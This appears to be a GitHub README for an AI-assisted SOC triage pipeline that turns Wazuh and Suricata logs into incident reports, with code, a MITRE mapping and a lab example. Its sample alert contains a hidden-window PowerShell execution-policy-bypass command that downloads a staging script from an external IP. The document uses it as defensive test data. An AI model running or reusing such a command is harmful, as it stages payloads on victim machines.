[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)

# Generative AI Incident Triage & Investigative Reporting

## 1. Executive Summary & Objective
* **Problem Statement:** During high-severity incidents, Tier 1 and Tier 2 analysts spend disproportionate time parsing inconsistent log formats and drafting reports, which slows response and produces documentation that varies by analyst.
* **Solution Overview:** This project is a Python pipeline that sends parsed security logs to the Gemini API (`gemini-3.5-flash`, extended thinking enabled) and returns a structured, compliance-formatted incident summary, reducing the manual drafting step without removing analyst review.
* **Core Capabilities:**
  * Parsing of multi-vendor telemetry (Wazuh, Suricata, Windows Event Logs).
  * A system prompt that constrains the model to stated facts and instructs it not to fill gaps.
  * MITRE ATT&CK mapping applied to the extracted log data.
  * Output formatted as an incident report.

## 2. Architecture & Environment Topology
The pipeline consumes telemetry produced by the shared lab environment (VirtualBox, `10.10.0.0/24`), specifically Wazuh alerts from `SRV-SOC01` and Suricata events from the IDS node. It runs on the same Ubuntu host.

* **Execution Runtime:** Python 3.x, using the official `google-genai` SDK.
* **Ingestion Source:** JSON output from Wazuh and security event logs.
* **API Integration:** Gemini API, model `gemini-3.5-flash`, with `thinking_level` set to `high`.
* **Reporting Focus:** Output structured for internal incident review (timeline, containment actions, root cause).

## 3. Engineering Thought Process & Methodology
* **Design Considerations:** LLMs can produce inconsistent output when reasoning over nested attack chains. Setting extended thinking to `high` forces internal reasoning steps before the model commits to an answer, which reduced incorrect conclusions during testing. This is not a guarantee against hallucination, so every report is reviewed before use.
* **Technical Challenges & Resolution:**
  * **Challenge:** Full log records carry metadata that isn't relevant to triage and dilutes the model's focus.
  * **Resolution:** A pre-parsing step (`log_parser.py`) strips each log down to the relevant fields (timestamp, rule description, source IP, raw command line) before it reaches the model.

## 4. Cyber Kill Chain & Threat Lifecycle Mapping
* **Delivery & Installation:** Flagging anomalous command strings, temp-directory drops, and unauthorized script execution.
* **Command and Control:** Extracting external IPs, outbound requests, and download utility usage from the log text.
* **Actions on Objectives:** Building a timeline of data staging or access events from the available fields.

## 5. MITRE ATT&CK Matrix Alignment

| Tactic | Technique ID | Technique Name | Detection Mechanism |
| :--- | :--- | :--- | :--- |
| **Execution** | T1059.001 | PowerShell | Parsing hidden-window flags and execution policy bypass strings from process telemetry. |
| **Command and Control** | T1105 | Ingress Tool Transfer | Extracting external URIs referenced in download utility commands. |
| **Collection** | T1114 | Email Collection | Structuring a timeline for exfiltration or collection activity in application logs. |

## 6. Model Used
* **Model:** Google Gemini 3.5 Flash (GA).
* **Reasoning Control:** `thinking_level="high"` set in the generation config to maximize reasoning depth on multi-step log correlation.

*Note: The Gemini API has since introduced a newer Interactions API. The code below reflects the `generate_content` structure used when this project was built.*

## 7. Implementation & Code

### Log Parsing & Field Extraction (`log_parser.py`)
```python
import json

def load_and_clean_log(file_path):
    with open(file_path, 'r') as file:
        raw_log = json.load(file)

    # Extract only actionable security fields to save token space
    cleaned_log = {
        "timestamp": raw_log.get("timestamp"),
        "rule_description": raw_log.get("rule", {}).get("description"),
        "source_ip": raw_log.get("agent", {}).get("ip"),
        "full_log": raw_log.get("full_log")
    }
    return json.dumps(cleaned_log)
```

### Prompting & Model Call (`ai_triage_engine.py`)
```python
import os
from google import genai
from google.genai import types

def generate_incident_report(cleaned_log):
    # Initialize the client (reads GEMINI_API_KEY from the environment)
    client = genai.Client()

    system_prompt = """
    You are a Tier 3 SOC Analyst. Analyze the provided security log.
    Extract the following information and format it as a markdown report:
    1. Executive Summary (2-3 sentences max)
    2. Extracted IoCs (IPs, Hashes, Domains)
    3. MITRE ATT&CK Tactic/Technique mapping
    4. Recommended Containment Steps
    Do not hallucinate data. If a field is missing, state 'Not present in logs'.
    """

    response = client.models.generate_content(
        model="gemini-3.5-flash",
        contents=cleaned_log,
        config=types.GenerateContentConfig(
            system_instruction=system_prompt,
            thinking_config=types.ThinkingConfig(thinking_level="high")
        )
    )

    return response.text
```

## 8. Pipeline Run Example
The log entry, IPs, and output below are lab-generated and demonstrate the pipeline's input and output format.

### Pipeline Invocation
```bash
export GEMINI_API_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXX"
python main_triage.py --log ./sample_alerts/example_alert.json --output ./reports/
```

### Sample Input Log
```json
{
  "timestamp": "2025-04-11T14:22:00Z",
  "rule": {
    "description": "PowerShell execution policy bypass detected",
    "level": 7
  },
  "agent": {
    "id": "01",
    "name": "WKSTN-01",
    "ip": "10.10.0.45"
  },
  "full_log": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri hxxp://203.0.113.55/stage1.ps1"
}
```

### Sample Output Report (`Incident_Report_LAB.md`)
```markdown
### Executive Summary
At 2025-04-11T14:22:00Z, the SIEM detected a PowerShell execution policy bypass originating from endpoint WKSTN-01. The process initiated an external network connection, indicating a likely payload staging attempt.

### Extracted Indicators of Compromise (IoCs)
- Source IP: 10.10.0.45
- Destination IP: 203.0.113.55
- Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest...

### MITRE ATT&CK Mapping
- Tactic: Execution (TA0002)
- Technique: Command and Scripting Interpreter: PowerShell (T1059.001)

### Recommended Containment Steps
1. Execute immediate network isolation on WKSTN-01 via EDR.
2. Block destination IP 203.0.113.55 at the perimeter firewall.
3. Run an anti-malware scan on the affected endpoint to check for dropped payloads.
```

## 9. Limitations & Future Enhancements
* **Known Limitation:** Model output is treated as a first-pass draft, not a final report. A human analyst reviews and corrects it before use. This pipeline speeds up drafting; it does not replace analyst judgment.
* **Future Roadmap:**
  * [ ] Add a structured output schema (JSON mode) to make report fields easier to validate programmatically.
  * [ ] Benchmark report accuracy against analyst-written reports on a held-out set of lab incidents.

<br><br><br>
[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)
